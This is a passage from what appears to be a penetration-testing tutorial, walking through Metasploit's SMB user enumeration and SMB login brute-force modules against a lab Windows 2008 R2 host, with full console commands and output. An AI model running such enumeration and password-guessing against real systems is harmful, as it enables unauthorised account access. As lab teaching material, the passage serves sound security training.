4. The SMB User Enumeration auxiliary module allows us to determine what local users exist via the SAM RPC service:

```
msf > use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(smb_enumusers) > set SMBPASS vagrant
SMBPASS => vagrant
msf auxiliary(smb_enumusers) > set SMBUSER vagrant
SMBUSER => vagrant
msf auxiliary(smb_enumusers) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(smb_enumusers) > run

[+] 192.168.216.10:445 - VAGRANT-2008R2 [ Administrator, anakin_skywalker, arto_detoo, ben_kenobi, boba_fett, chewbacca, c_three_pio, darth_vader, greedo, Guest, han_solo, jabba_hutt, jarjar_binks, kylo_ren, lando_calrissian, leia_organa, luke_skywalker, sshd, sshd_server, vagrant ] ( LockoutTries=0 PasswordMin=0 )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_enumusers) >
```

5. The SMB Login Check Scanner auxiliary module will test an SMB login on a range of machines and report successful logins:

```
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(smb_login) > set SMBUSER vagrant
SMBUSER => vagrant
msf auxiliary(smb_login) > set PASS_FILE /root/password.lst
PASS_FILE => /root/password.lst
msf auxiliary(smb_login) > run
...

[*] 192.168.216.10:445 - 192.168.216.10:445 - Domain is ignored for user vagrant
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_login) >
```